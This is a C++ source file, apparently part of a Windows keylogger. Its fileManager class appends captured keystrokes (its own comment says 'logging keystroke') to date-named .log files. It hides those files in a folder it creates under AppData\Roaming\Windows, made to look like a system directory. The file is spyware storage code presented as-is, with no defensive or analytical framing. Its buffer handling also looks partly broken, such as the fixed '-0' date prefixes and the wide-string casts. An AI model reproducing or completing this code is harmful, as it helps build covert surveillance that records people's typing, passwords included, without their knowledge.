#define ULEN 50
#define MAX_LENGTH 300
#include "stdafx.h"
#include "filemanager.h"
#include "strConvert.h"

using namespace std;
using namespace file;
using namespace str;

strConvert STRC;

char* fileManager::getlogfilename() {		// get name of .log file
	time_t t = time(NULL);
	struct tm basetm;
	localtime_s(&basetm, &t);
	static char time[80] = { 0, };
	char month[10], day[10] = { 0, };
	sprintf_s(time, sizeof(time), "%d", basetm.tm_year + 1900);
	sprintf_s(month, sizeof(month), "-0%d", basetm.tm_mon + 1);
	sprintf_s(day, sizeof(day), "-0%d", basetm.tm_mday);
	strcat_s(time, month); strcat_s(time, day); strcat_s(time, ".log");
	return time;
}

char* fileManager::getlogfilepath(char* filename) {		// get ultimate path of log file
	GetUserName(LPWSTR(username), &usersize);
	char dirpath[MAX_LENGTH] = "C:\\Users\\";
	char filepath[MAX_LENGTH] = "C:\\Users\\";
	static char filename2[MAX_LENGTH] = { 0, };
	strcat_s(dirpath, MAX_LENGTH, STRC.ConvertWCtoC(username));
	strcat_s(dirpath, MAX_LENGTH, "\\Appdata\\Roaming\\Windows\\");
	if (PathFileExists(LPWSTR(dirpath)) == NULL) {
		_mkdir(dirpath);
	}
	strcat_s(filepath, STRC.ConvertWCtoC(username));
	strcat_s(filepath, "\\Appdata\\Roaming\\Windows\\");
	strcat_s(filepath, filename);
	strcpy_s(filename2, MAX_LENGTH, filepath);
	return filename2;
}

void fileManager::logger(string key) {	// logging keystroke
	char ch_key[MAX_LENGTH] = { 0, };
	strcpy_s(ch_key, MAX_LENGTH, key.c_str());
	char* workFullPath;
	workFullPath = getlogfilepath(getlogfilename());
	fopen_s(&ff, workFullPath, "a+");
	fprintf(ff, "%s", ch_key);
	fclose(ff);
}

int fileManager::getfilesize() {		// get file size of .log file
	int rst = 0;
	errno_t err = 0;
	char* workFullPath;
	workFullPath = getlogfilepath(getlogfilename());
	if (workFullPath == NULL) {
		return rst;
	}
	err = fopen_s(&ff, workFullPath, "r");
	if (err == NULL) {
		fseek(ff, 0, SEEK_END);
		rst = ftell(ff);
		fclose(ff);
	}
	return rst;
}
